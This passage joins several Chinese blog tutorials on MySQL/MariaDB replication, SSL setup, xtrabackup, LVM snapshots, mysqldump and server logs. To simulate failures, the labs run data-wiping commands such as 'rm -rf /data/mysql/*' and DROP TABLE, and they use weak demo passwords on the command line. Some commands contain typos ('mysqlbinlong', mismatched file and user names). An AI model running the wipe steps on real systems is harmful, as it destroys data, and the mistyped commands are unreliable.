​\t默认情况下，MySQL的复制功能是异步的，异步复制可以提供最佳的性能，主库把binlog日志发送给从库即结束，并不验证从库是否接收完毕。这意味着当主服务器或从服务器端发生故障时，有可能从服务器没有接收到主服务器发送过来的binlog日志，这就会造成主服务器和从服务器的数据不一致，甚至在恢复时造成数据的丢失。\n在配置好mysql主从复制后，可以安装某些插件，只要有一台从服务器同步完成，即可认为数据同步。具体如下：\n在主服务器上：\ninstall plugin rpl_semi_sync_master soname \u0026#39;semisync_master.so\u0026#39;; show global variables like \u0026#39;%semi%\u0026#39;; +------------------------------------+-------+ | Variable_name | Value | +------------------------------------+-------+ | rpl_semi_sync_master_enabled | OFF | | rpl_semi_sync_master_timeout | 10000 | | rpl_semi_sync_master_trace_level | 32 | | rpl_semi_sync_master_wait_no_slave | ON | +------------------------------------+-------+ set global rpl_semi_sync_master_enabled=ON; 从服务器：\nstop slave; install plugin rpl_semi_sync_slave soname 'semisync_slave.so'; set global rpl_semi_sync_slave_enabled=ON; start slave; 加密复制 ssh证书安装，相关的ca证书知识，源于openssl，具体原理可以参考博主前面的博文。\n 在默认的主从复制过程或远程连接到MySQL/MariaDB所有的链接通信中的数据都是明文的，外网里访问数据或则复制，存在安全隐患。通过SSL/TLS加密的方式进行复制的方法，来进一步提高数据的安全性\n官方配置查看\n 主服务器开启SSL：[mysqld] 加一行ssl 主服务器配置证书和私钥；并且创建一个要求必须使用SSL连接的复制账号 从服务器使用CHANGER MASTER TO 命令时指明ssl相关选项   具体证书生成： $ mkdir /etc/my.cnf.d/ssl/ $ ls /etc/my.cnf.d/ssl/ $ cd /etc/my.cnf.d/ssl/ $ openssl pwd $ openssl genrsa 2048 $ openssl genrsa 2048 \u0026gt; cakey.pem #自签名证书 $ openssl req -new -x509 -key cakey.pem -out cacert.pem -days 3650 Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:beijing Locality Name (eg, city) [Default City]:beijing Organization Name (eg, company) [Default Company Ltd]:mysql Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server's hostname) []:ca.mysql.com #生成master证书申请，最后的server's和自签名证书不同即可 $ openssl req -newkey rsa:2048 -days 365 -nodes -keyout master.key \u0026gt; master.csr #制作master的crt证书 $ openssl x509 -req -in master.csr -CA cacert.pem -CAkey cakey.pem -set_serial 01 \u0026gt; master.crt #生成slave证书申请，最后的server's和master证书不同即可 $ openssl req -newkey rsa:2048 -days 365 -nodes -keyout salve.key \u0026gt; slave.csr #制作slave的crt证书 $ openssl x509 -req -in slave.csr -CA cacert.pem -CAkey cakey.pem -set_serial 02 \u0026gt; slave.crt #确认证书是否成功 $ openssl verify -CAfile cacert.pem master.crt slave.crt cacert.pem: OK master.crt: OK slave.crt: OK #将证书和key分别复制到相应的主机。 $ scp -r cacert.pem master.crt master.key 192.168.1.8:/etc/my.cnf.d/ $ scp -r cacert.pem slave.crt slave.key 192.168.1.18:/etc/my.cnf.d/ 主服务器配置 $ vim /etc/my.cnf [mysqld] log_bin server_id=1 ssl ssl-ca=/etc/my.cnf.d/ssl/cacert.pem ssl-cert=/etc/my.cnf.d/ssl/master.crt ssl-key=/etc/my.cnf.d/ssl/master.key $ systemctl restart mariadb grant replication slave on *.* to repluse@'192.168.1.%' identified by 'centos' require ssl; 从服务器配置 $ mysql -urepluser -preplpass -h192.168.1.8 --ssl-ca=/etc/my.cnf.d/ssl/cacert.pem --ssl-cert=/etc/my.cnf.d/ssl/slave.crt --ssl-key=/etc/my.cnf.d/ssl/slave.key STOP SLAVE; reset slave all; CHANGE MASTER TO MASTER_HOST='192.168.1.8', MASTER_USER='repluser', MASTER_PASSWORD='centos', MASTER_PORT=3306, MASTER_LOG_FILE='master-bin.000001', MASTER_LOG_POS=245, MASTER_SSL=1, MASTER_SSL_CA = '/etc/my.cnf.d/ssl/cacert.pem', MASTER_SSL_CERT = '/etc/my.cnf.d/ssl/slave.crt', MASTER_SSL_KEY = '/etc/my.cnf.d/ssl/slave.key'; start slave； 指令集合 -- 启动主从复制 START SLAVE; STOP SLAVE; #停止复制 SHOW SLAVE STATUS; #查看复制状态 Seconds_Behind_Master: 0 #从服务器是否落后于主服务 RESET SLAVE ALL; #重置从服务器的配置 MASTER_SSL=1, #配合 CHANGE MASTER TO 使用，开启ssl加密复制 MASTER_SSL_CA = '/etc/my.cnf.d/ssl/cacert.pem', MASTER_SSL_CERT = '/etc/my.cnf.d/ssl/slave.crt', MASTER_SSL_KEY = '/etc/my.cnf.d/ssl/slave.key'; PURGE { BINARY | MASTER } LOGS { TO 'log_name' | BEFORE datetime_expr } #删除二进制日志，谨慎操作 SHOW MASTER STATUS #查看二进制日志状态 SHOW BINLOG EVENTS #查看二进制日志 SHOW BINARY LOGS #查看二进制日志 SHOW PROCESSLIST #查看进程，一般配合kill进程使用， KILL id #杀掉进程 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-14-mysql-08/","tags":["Linux","slave"],"title":"MYSQL主从复制"},{"categories":["mysql"],"contents":"**摘要：**mysql数据库的备份应用软件，xtrabackup的下载，安装，简要用法说明，小实验。\nxtrabackup mariadb的版本：5.5.56-MariaDB\n下载最新的percondn-xtrabackup,官网最新资源，centos7下载如下\n$ wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.11/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.11-1.el7.x86_64.rpm 下载完毕后，安装xtrabackup,需要启用epel源，进行依赖安装\n$ yum install -y percona-xtrabackup-24.x86_64 0:2.4.11-1.el7 相关说明 备份原理及备份的文件代表意思\n​\t使用innobakupex备份时，其会调用xtrabackup备份所有的InnoDB表，复制所有关于表结构定义的相关文件(.frm)、以及MyISAM、MERGE、CSV和ARCHIVE表的相关文件，同时还会备份触发器和数据库配置信息相关的文件。这些文件会被保存至一个以时间命名的目录中,在备份时，innobackupex还会在备份目录中创建如下文件：\n xtrabackup_checkpoints：备份类型（如完全或增量）、备份状态（如是否已经为prepared状态）和LSN(日志序列号)范围信息,每个InnoDB页(通常为16k大小)都会包含一个日志序列号，即LSN。LSN是整个数据库系统的系统版本号，每个页面相关的LSN能够表明此页面最近是如何发生改变的 xtrabackup_binlog_info：MySQL服务器当前正在使用的二进制日志文件及至备份这一刻为止二进制日志事件的位置 xtrabackup_info：innobackupex工具执行时的相关信息 backup-my.cnf：备份命令用到的配置选项信息 xtrabackup_logfile：备份生成的日志文件\n 用法说明 详细请参考官方说明。\n备份 备份时：innobackupex [option] BACKUP-ROOT-DIR\noption：\n --user：该选项表示备份账号 --password：该选项表示备份的密码 --host：该选项表示备份数据库的地址 --databases：该选项接受的参数为数据名，如果要指定多个数据库，彼此间需要以空格隔开； --defaults-file：该选项指定从哪个文件读取MySQL配置，必须放在命令行第一个选项位置 --incremental：该选项表示创建一个增量备份，需要指定--incremental-basedir --incremental-basedir：该选项指定为前一次全备份或增量备份的目录，与--incremental同 用 --incremental-dir：该选项表示还原时增量备份的目录 --include=name：指定表名，格式：databasename.tablenam\n 还原前准备 prepare还原:innobackupex --apply-log [option] BACKUP-DIR\noption:\n --apply-log：一般情况下,在备份完成后，数据尚且不能用于恢复操作，因为备份的数据中可能会包含尚未提交的事务或已经提交但尚未同步至数据文件中的事务。因此，此时数据文件仍处理不一致状态.此选项作用是通过回滚未提交的事务及同步已经提交的事务至数据文件使数据文件处于一致性状态; --use-memory：该选项表示和\u0026ndash;apply-log选项一起使用，prepare 备份的时候，xtrabackup做crash recovery分配的内存大小，单位字节。也可(1MB,1M,1G,1GB)，推荐1G； --export：表示开启可导出单独的表之后再导入其他Mysql中； --redo-only：此选项在prepare base full backup，往其中merge增量备份时候使用.\n 还原 还原：\ninnobackupex --copy-back [选项] BACKUP-DIR\ninnobackupex --move-back [选项][--defaults-group=GROUP-NAME]BACKUP-DIR\n选项说明：\n \u0026ndash;copy-back：做数据恢复时将备份数据文件拷贝到MySQL服务器的datadir; \u0026ndash;move-back：这个选项与\u0026ndash;copy-back相似，唯一的区别是它不拷贝文件，而是移动文件到目的地。这个选项移除backup文件，用时候必须小心。使用场景：没有足够的磁盘空间同事保留数据文件和Backup副本.\n 实验 前提： 最好启用二进制日志，并于数据文件分开存放。实验的配置文件如下：/etc/my.cnf\n[mysqld] datadir=/data/mysql log_bin=/data/binlog/mysql-bin socket=/var/lib/mysql/mysql.sock # Disabling symbolic-links is recommended to prevent assorted security risks symbolic-links=0 # Settings user and group are ignored when systemd is used. # If you need to run mysqld under a different user or group, # customize your systemd unit file for mariadb according to the # instructions in http://fedoraproject.org/wiki/Systemd [mysqld_safe] log-error=/var/log/mariadb/mariadb.log pid-file=/var/run/mariadb/mariadb.pid # # include all files from the config directory # !includedir /etc/my.cnf.d 全备份 ​\t在全备份的基础上，每天做增量备份，最后一次的未提交的事务是不能备份，只能rollback。\n#开始的全备份，并新建增量备份文件夹 $ innobackupex /backups $ mkdir /backups/inc{1,2} -pv 模拟插入数据 -- 模拟第一天的插入数据，然后进行第一次增量备份 insert into students values(\u0026#39;30\u0026#39;,\u0026#39;hong\u0026#39;,26,\u0026#39;M\u0026#39;,1,2); insert into students values(\u0026#39;27\u0026#39;,\u0026#39;feng\u0026#39;,28,\u0026#39;M\u0026#39;,3,2); -- 模拟第二天的插入数据及开启事务，然后进行第二次增量备份 insert into students values(\u0026#39;28\u0026#39;,\u0026#39;li\u0026#39;,18,\u0026#39;M\u0026#39;,1,2); -- 开启事务,未commit，会导致这个事务备份不了。 start transaction; update students set name=\u0026#39;dongfei\u0026#39; where stuid=25; 增量备份 # 第一次增量备份 $ innobackupex --incremental /backups/inc1/ --incremental-basedir=/backups/2018-06-14_12-51-10 # 第二次增加备份 $ innobackupex --incremental /backups/inc2 --incremental-basedir=/backups/inc1/2018-06-14_12-53-25/ $ scp -a /backup/* 192.168.1.10:/backups/ 目标主机恢复数据 #模拟数据损坏 $ systemctl stop mariadb $ rm -rf /data/mysql/* #整理innobackupex的备份文件 $ innobackupex --apply-log --redo-only /backups/2018-06-14_12-51-10/ $ innobackupex --apply-log --redo-only /backups/2018-06-14_12-51-10/ --incremental-dir=/backups/inc1/2018-06-14_12-53-25/ $ innobackupex --apply-log --redo-only /backups/2018-06-14_12-51-10/ --incremental-dir=/backups/inc2/2018-06-14_12-57-41/ $ ls /var/lib/mysql/ $ innobackupex --copy-back /backups/2018-06-14_12-51-10/ $ chown -R mysql.mysql /data/mysql/ $ systemctl start mariadb $ mysql hellodb -e \u0026#39;select * from students\u0026#39; +-------+---------------+-----+--------+---------+-----------+ | StuID | Name | Age | Gender | ClassID | TeacherID | +-------+---------------+-----+--------+---------+-----------+ ··· #未commit的数据会回滚，并不会更新。 | 25 | Sun Dasheng | 100 | M | NULL | NULL | | 26 | dongfei | 25 | M | 2 | 3 | | 27 | feng | 28 | M | 3 | 2 | | 28 | li | 18 | M | 1 | 2 | | 30 | hong | 26 | M | 1 | 2 | +-------+---------------+-----+--------+---------+-----------+ 单表操作 生产中，数据量很大，实现全备份的时间，可能会很长，对于某些重要的大型表，我们可以实现xtrabackup的单表导入导出。\n单表备份 对比较重要的大型表，比如students表进行备份，包含数据及表结构\n$ innobackupex --include=\u0026#34;hellodb.students\u0026#34; /backup/ $ ls /backup/2018-06-13_15-57-49/hellodb/ -l $ mysql -e \u0026#39;show create table hellodb.students\u0026#39; $ mysql -e \u0026#39;show create table hellodb.students\u0026#39; \u0026gt; students.sql 模拟表损坏及丢失 $ mysql -e 'drop table hellodb.students' $ ll /data/mysqldb/hellodb/ -l 备份还原  整理备份文件，修改表结构  $ innobackupex --apply-log --export /backup/2018-06-13_15-57-49/ $ ls /backup/2018-06-13_15-57-49/hellodb/ -l $ mysql hellodb -e \u0026#39;select * from students\u0026#39; $ vim students.sql #修改表结构如下 CREATE TABLE `students` (\\n `StuID` int(10) unsigned NOT NULL AUTO_INCREMENT,\\n `Name` varchar(50) NOT NULL,\\n `Age` tinyint(3) unsigned NOT NULL,\\n `Gender` enum(\u0026#39;F\u0026#39;,\u0026#39;M\u0026#39;) NOT NULL,\\n `ClassID` tinyint(3) unsigned DEFAULT NULL,\\n `TeacherID` int(10) unsigned DEFAULT NULL,\\n PRIMARY KEY (`StuID`)\\n) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 $ mysql hellodb \u0026lt; students.sql $ ls /data/mysqldb/hellodb/ -l 删除表空间,将备份好的数据复制到数据库中  $ mysql -e \u0026#39;alter table hellodb.students discard tablespace\u0026#39; $ ls /data/mysqldb/hellodb/ -l $ cd /backup/2018-06-13_15-57-49/hellodb/ $ cp /backup/2018-06-13_15-57-49/hellodb/students.{cfg,exp,ibd} /data/mysqldb/hellodb/ 将备份好的数据改变所有者，所属组，导入新的表空间，还原成功。  $ chown mysql.mysql /data/mysqldb/hellodb/* $ ll /data/mysqldb/hellodb/* $ mysql hellodb -e \u0026#39;alter table students import tablespace\u0026#39; $ mysql hellodb -e \u0026#39;select * from students\u0026#39; 总结：  增量备份是基于全备份的基础上进行备份的，备份和还原的时候注意路径的区别; xtrabackup备份的数据所有者和所属组需要改为mysql； 备份一定要开启二进制日志文件，才能完备的进行还原。  ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-13-mysql-07/","tags":["Linux","mysql","xtrabackup"],"title":"MYSQL之xtrabackup"},{"categories":["mysql"],"contents":"摘要：MYSQL的lvm快照备份实现过程，mysqldump备份的过程.\nLVM快照备份 特点：近乎热备的备份\n实现LVM $ echo '- - -' \u0026gt; /sys/class/scsi_host/host2/scan $ lsblk $ pvcreate /dev/sdb $ vgcreate vg0 /dev/sdb $ lvcreate -n lv_mysql -l 50%FREE vg0 $ lvcreate -n lv_binlog -l 50%FREE vg0 $ mkfs.ext4 /dev/vg0/lv_mysql $ mkfs.ext4 /dev/vg0/lv_binlog $ mkdir /data/{mysql,binlog} $ mount /dev/vg0/lv_mysql /data/mysql $ mount /dev/vg0/lv_binlog /data/binlog $ chown -R mysql.mysql /data/ $ vim /etc/my.cnf datadir=/data/mysql log_bin=/data/binlog/mysql-bin $ systemctl restart mariadb 快照备份 -- 读锁表 flush tables with read lock; -- 刷新日志 flush logs; -- 记录bin-log的position show master logs; +------------------+-----------+ | Log_name | File_size | +------------------+-----------+ | mysql-bin.000001 | 17750 | | mysql-bin.000002 | 385 | +------------------+-----------+ -- 创建lvm快照 lvcreate -n lv_mysql_snap -L 10G -s -p r /dev/vg0/lv_mysql -- 解锁 unlock tables; -- 将快照的数据备份出来,centos6不用加-o选项 $ mount -o nouuid,norecovery /dev/vg0/lv_mysql_snap /mnt $ cp -a /mnt/ /backup $ umount /mnt $ lvremove /dev/vg0/lv_mysql_snap 模拟场景 -- 数据已经变更 create database testdb; use hellodb; update students set name=\u0026#39;houzi\u0026#39; where stuid=25; drop table teachers; 备份恢复至最新状态 $ rm -rf /data/mysql/* -- 禁止用户访问 $ systemctl stop mariadb $ cp -av /backup/* /data/mysql $ vim /etc/my.cnf [mysqld] skip_network $ systemctl start mariadb $ mysql flush tables with read lock; show master logs; -- 导入最新的二进制日志，恢复至破坏后的节点 $ mysqlbinlong --start-position=385 mysql-bin.000004 \u0026gt;/backup/bin.sql $ mysqlbinlong --start-position=385 mysql-bin.000005 \u0026gt;\u0026gt;/backup/bin.sql $ mysql \u0026lt; /backup/bin.log mysqldump备份 mysqldump参考： 官方说明\nmysqldump常见选项\n-A， --all-databases 备份所有数据库，含create database -B , --databases db_name… 指定备份的数据库，包括create database语句 -E, --events：备份相关的所有event scheduler -R, --routines：备份所有存储过程和存储函数 --triggers：备份表相关触发器，默认启用,用--skip-triggers，不备份触发器 --master-data[=#]： 此选项须启用二进制日志 1：所备份的数据之前加一条记录为CHANGE MASTER TO语句，非注释，不指定#，默认为1 2：记录为注释的CHANGE MASTER TO语句此选项会自动关闭--lock-tables功能，自动打开--lock-all-\ttables功能（除非开启--single-transaction） -F, --flush-logs ：备份前滚动日志，锁定表完成后，执行flush logs命令,生成新的二进制日志文件，配合-A时，会导致刷新多次数据库，在同一时刻执行转储和日志刷新，则应同时使用--flush-logs和-x，--master-data或-single-transaction,此时只刷新一次，建议：和-x，--master-data或 --single-transaction一起使用 --compact 去掉注释，适合调试，生产不使用 -d, --no-data 只备份表结构 -t, --no-create-info 只备份数据,不备份create table -n,--no-create-db 不备份create database，可被-A或-B覆盖 --flush-privileges 备份mysql或相关时需要使用 -f, --force 忽略SQL错误，继续执行 --hex-blob 使用十六进制符号转储二进制列（例如，“abc”变为0x616263），受影响的数据类型包括BINARY， VARBINARY，BLOB，BIT -q, --quick 不缓存查询，直接输出，加快备份速度 实验选项演示: 比较常用的是mysqldump -A,mysqldump -A -F,mysqldump -B database\n$ mysqldump -uroot -pcentos -B hellodb \u0026gt; /backup/hellodb_B.sql $ mysqldump -uroot -pcentos -A |gzip \u0026gt; /backup/all.sql.gz $ rm -rf /var/lib/mysql/* $ gzip -d /backip/all.sql.gz #gunzip /backip/all.sql.gz $ mysql \u0026lt; /backup/all.sql $ mysqldump -A -F \u0026gt; /backup/all_f.log # 滚动刷新日志 $ mysql -e 'show binary logs' InnoDB备份选项：  支持热备，可用温备但不建议用 --single-transaction 此选项Innodb中推荐使用，不适用MyISAM，此选项会开始备份前，先执行START TRANSACTION指令开启事务; 此选项通过在单个事务中转储所有表来创建一致的快照。 仅适用于存储在支持多版本控制的存储引擎中的表（目前只有InnoDB可以）; 转储不保证与其他存储引擎保持一致。 在进行单事务转储时，要确保有效的转储文件（正确的表内容和二进制日志位置），没有其他连接应该使用以下语句：ALTER TABLE，DROP TABLE，RENAME TABLE，TRUNCATE TABLE; 此选项和--lock-tables（此选项隐含提交挂起的事务）选项是相互排斥; 备份大型表时，建议将--single-transaction选项和--quick结合一起使用;\n MyISAM备份选项：  支持温备；不支持热备，所以必须先锁定要备份的库，而后启动备份操作 锁定方法如下： -x,--lock-all-tables:,加全局读锁，锁定所有库的所有表，同时加--single-transaction或--lock-tables选项会关闭此选项功能 注意：数据量大时，可能会导致长时间无法并发访问数据库 -l,--lock-tables：对于需要备份的每个数据库，在启动备份之前分别锁定其所有表，默认为on,--skip-lock-tables选项可禁用,对备份MyISAM的多个库,可能会造成数据不一致 注：以上选项对InnoDB表一样生效，实现温备，但不推荐使用\n 实验 实验1 实现不同数据库的备份，但是和mysqldump -A不同，将每个数据库分别打包 **方法1：**利用sed,生成一个备份脚本\n$ mysql -e 'show databases' | grep -iEv 'database|schema' | sed -r 's/(.*)/mysqldump -uroot -B \\1 |gzip \u0026gt;\\1-`date +%F`.sql.gz/' \u0026gt;backup.sh $ cat backup.sh mysqldump -uroot -B hellodb |gzip \u0026gt;hellodb-`date +%F`.sql.gz mysqldump -uroot -B mysql |gzip \u0026gt;mysql-`date +%F`.sql.gz mysqldump -uroot -B test |gzip \u0026gt;test-`date +%F`.sql.gz **方法2：**利用for循环，\n#!/bin/bash for db in `mysql -e \u0026#39;show databases\u0026#39; | grep -iEv \u0026#39;database|schema\u0026#39;` ;do mysqldump -uroot -B $db \u0026gt; ${db}-`date +%F`.sql.gz done 总结：\n复习了脚本的用法及sed，grep,gzip，for循坏，又能够实现备份不同数据库的分类存档\n实验2 场景：数据库文件损坏，如何恢复。前提：有备份文件,启用了二进制日志；\n$ mysql \u0026lt; hellodb.sql $ mysqldump -A -F --single-transaction --master-data=1 \u0026gt;/backup/full.sql $ less |/backup/full.sql ··· #记录的节点位置 CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000004', MASTER_LOG_POS=245; ··· 模拟数据改变\n-- 数据发生了变化 create database testdb; use hellodb; update students set name='houzi' where stuid=25; drop table teachers; 删库恢复\n$ vim /etc/my.cnf [mysqld] skip_network $ rm -rf /data/mysql/* #数据被破坏 $ mysql -e 'use hellodb' ERROR 1049 (42000): Unknown database 'hellodb' $ systemctl restart mariadb $ mysqlbinlog --start-position=245 mysql-bin.000004 \u0026gt;/backup/bin.sql $ mysql \u0026lt; /backup/full.sql $ mysql \u0026lt; /backup/bin.sql 实验3 场景：9点有全备份，10点的时候误删除表，10:10后续用户修改过另外一张表，如何还原把删除表的操作还原；条件：log-bin必须启用，有数据备份。\n场景模拟\n$ mysqldump -A -F --single-transaction --master-data=1 \u0026gt;/backup/full.sql -- 修改表 use hellodb insert students values(26,'dongfei',25,'M',2,3) -- 误删除 drop table students; -- 用户继续修改 insert courses values(8,'magedu'); 定点到删除的位置\nflush tables with read lock; flush logs; -- 查看当前的bin-log的position show master logs; #查询全备份的position，确定全备份到目前之间的所有日志文件及position $ head /backup/full.sql CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000009', MASTER_LOG_POS=245; #找到删除语句的，删除此语句 $ mysqlbinlog --start-position=245 mysql-bin.000009 \u0026gt;/backup/bin.sql $ vim /backup/bin.sql 将drop table students; 这个语句的执行at段删掉即可 还原\n$ systemctl stop mariadb $ rm -rf /data/mysql/* $ systemctl start mariadb $ mysql \u0026lt; /backup/full.sql $ mysql \u0026lt; /backup/bin.sql $ mysql -e 'show tables' +-------------------+ | Tables_in_hellodb | +-------------------+ | classes | | coc | | courses |\t| scores | | students |\t#恢复删错的表，且最新数据保存下来了 | teachers | | toc | +-------------------+ 生产环境备份实战策略 innodb:建议的策略\n#!/bin/bash BACKUP=\u0026quot;/backup\u0026quot; BACKUP_TIME=`date +%F_%T` mysqldump -uroot -ppassword -A -F -E -R --single-transaction --master-data=1 --flush-privileges \u0026gt; $BACKUP/fullbak_$BACKUP_TIME.sql MyISAM:建议备份策略\n#!/bin/bash BACKUP=\u0026quot;/backup\u0026quot; BACKUP_TIME=`date +%F_%T` mysqldump -uroot -ppassword -A -F -E -R -x --master-data=1 --flush-privileges \u0026gt;${BACKUP} /fullbak_${BACKUP_TIME}.sql ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-13-mysql-06/","tags":["Linux","backup"],"title":"MYSQL备份"},{"categories":["mysql"],"contents":"摘要：MYSQL的日志，事务日志，错误日志，通用日志，慢查询日志，二进制日志的学习过程,其中的相关变量均可以参考官网配置\n日志 日志分类：\n 事务日志： transaction log 中继日志： reley log 错误日志： error log 通用日志： general log 慢查询日志： slow query log 二进制日志： binary log  命令日志：]#cat .mysql.history,当前终端的命令日志不会保存，退出后自动保存至改文件\n事务日志   事务日志：transaction log\n  事务型存储引擎自行管理和使用，建议和数据文件分开存放\n  redo log 已经做的事务日志 undo log 未做的事务日志\nInnodb事务日志相关配置： innodb_log_file_size是一个global,但不是dynamic的变量，要想生效，必须写入配置文件中。\nshow variables like \u0026#39;%innodb_log%\u0026#39;; innodb_log_file_size 5242880 -- 每个日志文件大小,/var/lib/mysql/ib_logfile innodb_log_files_in_group 2 -- 日志组成员个数，建议调大 innodb_log_group_home_dir ./ -- 事务文件路径 调大日志文件,事务日志文件路径,（建议单独存放）\n$ mkdir -pv /data/mysqllogs/ $ chmod mysql.mysql /data/mysqllogs/ $ vim /etc/my.cnf [mysqld] innodb_log_files_in_group=5 #仅修改日志数会导致服务起不来 innodb_log_group_home_dir=/data/mysqllogs/ $ systemctl restart mariadb  中继日志：relay log  主从复制架构中，从服务器用于保存从主服务器的二进制日志中读取到的事件\n错误日志 错误日志：\n mysqld启动和关闭过程中输出的事件信息 mysqld运行中产生的错误信息 event scheduler运行一个event时产生的日志信息 在主从复制架构中的从服务器上启动从服务器线程时产生的信息  错误日志相关配置：SHOW GLOBAL VARIABLES LIKE 'log_error'；\n 错误文件路径，配置文件位置：/etc/my.cnf  log_error=/PATH/TO/LOG_ERROR_FILE\n 是否记录警告信息至错误日志文件  log_warnings=1|0 默认值1\n通用日志 **通用日志：**记录对数据库的通用操作，包括错误的SQL语句\n 文件：file，默认值 表：table general_log: OFF，默认值，全局变量，global，，dynamic log_output: FILE，默认值  通用日志相关设置:\nshow variables like \u0026#39;general_log%\u0026#39;; +------------------+---------------+ | Variable_name | Value | +------------------+---------------+ | general_log | OFF | | general_log_file | localhost.log | +------------------+---------------+ set global general_log=on; show variables like \u0026#39;log_output\u0026#39;; +---------------+-------+ | Variable_name | Value | +---------------+-------+ | log_output | FILE |\t-- TABLE|FILE|NONE +---------------+-------+ set global log_output=table; 实验 目标：生成大文件的事务日志文件，了解事务日志的原理，及相应的特殊性\n准备工作 每个表单独使用一个表空间存储表的数据和索引,在配置文件/etc/my.cnf中，加入innodb_file_per_table=ON，便于日志的观察\n$ vim /etc/my.cnf [mysqld] innodb_file_per_table=ON 生成大文件脚本 use testdb -- 脚本内容 create table testlog (id int auto_increment primary key,name char(10),age int default 20); delimiter $$ create procedure pro_testlog() begin declare i int; set i = 1; while i \u0026lt; 100000 do insert into testlog(name,age) values(concat(\u0026#39;wang\u0026#39;,i),i) ; set i = i +1; end while; end$$ delimiter ; 使用相关脚本实验 start transaction; -- 生成大数据事务 call pro_testlog; call pro_testlog; call pro_testlog; -- 查询数据 select count(*) from testlog; \\! ls -lh /var/lib/mysql/testdb/testlog.ibd -- 数据直接写入数据文件，超过了事务日志的大小。 truncate testlog; -- 删除数据库 delete from testlog; -- 用delete删除大文件，查询数据文件没有减少,需要optimize进行清除。 \\! ls /var/lib/mysql/testdb/testlog.ibd -h optimize table testlog; 实验总结： 超过了事务日志的大小的数据文件，事务的操作直接写入数据文件，该操作由于事务日志文件太小导致，建议加大，增加安全；删除大文件的是，有两种方法`truncate testlog;`或者`delete from testlog;`和`optimize table testlog;`进行删除。  慢查询日志 slow_query_log，是一个global,sesion,dynamic的变量，支持动态修改\nshow variables like \u0026#39;slow%\u0026#39;; +---------------------+--------------------+ | Variable_name | Value | +---------------------+--------------------+ | slow_launch_time | 2 | | slow_query_log | OFF | | slow_query_log_file | localhost-slow.log | +---------------------+--------------------+ set global slow_query_log=ON; -- ll /var/lib/mysql/hellodb/ select sleep(1),name from students; -- 查询谁在占用 show processlist; 和慢查询相关的设置\nuse hellodb -- 查询时间不少于10s，或者不使用索引，系统自动默认OFF -- log_queries_not_using_indexes=OFF select * from students; -- 系统自动优化sql语句，可能使用索引或不使用 explain select * from students where name like \u0026#39;x%\u0026#39;\\G; explain select * from students where name like \u0026#39;s%\u0026#39;\\G; profiling:global,sesion,dynamic,全局，会话，可动态修改的变量，可以根据show profiles，来慢查询一些相对耗时的sql语句,进行优化\nset profiling=ON; show variables like \u0026#39;prof%\u0026#39;; +------------------------+-------+ | Variable_name | Value | +------------------------+-------+ | profiling | ON | | profiling_history_size | 15 | +------------------------+-------+ show profiles; +----------+------------+------------------------+ | Query_ID | Duration | Query | +----------+------------+------------------------+ | 1 | 0.00041210 | select @@profiling | | 2 | 0.09205547 | select * from students | +----------+------------+------------------------+ show profile for query 2; +--------------------------------+----------+ | Status | Duration | +--------------------------------+----------+ | starting | 0.000016 | | Waiting for query cache lock | 0.000003 | | init | 0.000002 | | checking query cache for query | 0.000144 | | checking permissions | 0.000010 | | Opening tables | 0.090296 | | After opening tables | 0.000014 | | System lock | 0.000045 | | Table lock | 0.000013 | | Waiting for query cache lock | 0.000168 | | init | 0.000176 | | optimizing | 0.000012 | | statistics | 0.000016 | | preparing | 0.000019 | | executing | 0.000003 | | Sending data | 0.000599 | | end | 0.000010 | | query end | 0.000007 | | closing tables | 0.000004 | | Unlocking tables | 0.000015 | | freeing items | 0.000007 | | updating status | 0.000005 | | Waiting for query cache lock | 0.000003 | | updating status | 0.000419 | | Waiting for query cache lock | 0.000008 | | updating status | 0.000003 | | storing result in query cache | 0.000008 | | cleaning up | 0.000034 | +--------------------------------+----------+ 二进制日志 记录所有的增删改\n 记录导致数据改变或潜在导致数据改变的SQL语句 记录已提交的日志 不依赖于存储引擎类型 功能：通过“重放”日志文件中的事件来生成数据副本 注意：建议二进制日志和数据文件分开存放  二进制日志记录格式 二进制日志记录三种格式\n 基于“语句”记录：statement，记录语句，默认模式 基于“行”记录：row，记录数据，日志量较大，建议使用这个模式 混合模式：mixed, 让系统自行判定该基于哪种方式进行  格式查看：show variables like '%binlog_format%';\n二进制日志文件的构成\n  日志文件：mysql|mariadb-bin.文件名后缀，二进制格式\n  索引文件：mysql|mariadb-bin.index，文本格式\n  二进制日志相关的服务器变量： mariadb-10.2.15:\nsql_log_bin：global,dynamic，可以动态开启关闭\nsql_log_bin=ON|OFF： -- 是否记录二进制日志，默认ON log_bin=/PATH/BIN_LOG_FILE： -- 指定文件位置；默认ON，表示不启用二进制日志功能，上述两项都为ON才可 max_binlog_size=1073741824： -- 单个二进制日志文件的最大体积，到达最大值会自动滚动，默认为1G sync_binlog=1|0： -- 设定是否启动二进制日志即时同步磁盘功能，默认0，由操作系统负责同步日志到磁盘 expire_logs_days=N： -- 二进制日志可以自动删除的天数。 默认为0，即不自动删除  二进制日志相关配置 配置相关:\nshow master logs; show binary logs; -- 查询二进制的日志文件 show master status; update students set name=\u0026#39;xyz\u0026#39; where stuid=10; show binlog events in \u0026#39;mysql-bin.000003\u0026#39; from 1577; -- 重新生成二进制日志文件 flush logs; show master status; 日志 mysqlbinlog：二进制日志的客户端命令工具\n命令格式：\nmysqlbinlog [OPTIONS] log_file… --start-position=# 指定开始位置 --stop-position=# --start-datetime= --stop-datetime= 时间格式：YYYY-MM-DD hh:mm:ss，--base64-output[=name]\n查询mysqlbinlog --help 来帮助自己更好理解此命令\n示例：\n$ mysqlbinlog --start-position=6787 --stop-position=7527 /var/lib/mysql/mariadb-bin.000003 $ mysqlbinlog --start-datetime=\u0026quot;2018-01-30 20:30:10\u0026quot; --stop-datetime=\u0026quot;2018-01-30 20:35:22\u0026quot; mariadb-bin.000003; 二进制日志格式 mysqlbinlog查询的日志格式如下：\nBEGIN /*!*/; # at 1619 #180611 14:24:50 server id 1 end_log_pos 1734 CRC32 0x7c5b65fe Query\tthread_id=15\texec_time=0\terror_code=0 SET TIMESTAMP=1528698290/*!*/; update students set name='xyz' where stuid=10 /*!*/; # at 1734 